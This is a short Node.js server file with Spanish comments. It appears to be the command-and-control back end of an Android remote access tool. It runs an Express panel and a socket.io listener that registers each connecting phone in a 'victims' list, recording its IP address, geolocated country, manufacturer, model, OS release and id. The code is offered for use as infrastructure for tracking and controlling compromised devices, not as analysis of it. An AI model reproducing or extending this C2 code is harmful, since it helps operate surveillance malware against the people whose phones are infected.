var express = require('express')
var io = require('socket.io');
var geoip = require('geoip-lite');
var victimsList = require('./app/assets/js/model/Victim');
module.exports = victimsList;

var IO;

var app = express()

app.use(express.static('app'));
//app.get('/', function(req, res){
//	res.sendFile(__dirname + '/app/index.html');
//});

var server = app.listen(8080, function () {

    /*var host = server.address().address
    var port = server.address().port

    console.log('Express app listening at http://%s:%s', host, port)*/

})


/*Iniciando IO Socket Listener*/

IO = io.listen(42474);
IO.sockets.pingInterval = 10000;
IO.sockets.on('connection', function(socket) {

console.log('Nueva Conexion Server');

	var address = socket.request.connection;
	var query = socket.handshake.query;
	var index = query.id;
console.log(query.web);	
	if(query.web != true){
		var ip = address.remoteAddress.substring(address.remoteAddress.lastIndexOf(':') + 1);
		var country = null;
		var geo = geoip.lookup(ip); // check ip location
		if (geo)
		country = geo.country.toLowerCase();

		victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id);
	}
	

	socket.on('disconnect', function() {
		victimsList.rmVictim(index);
	});

});

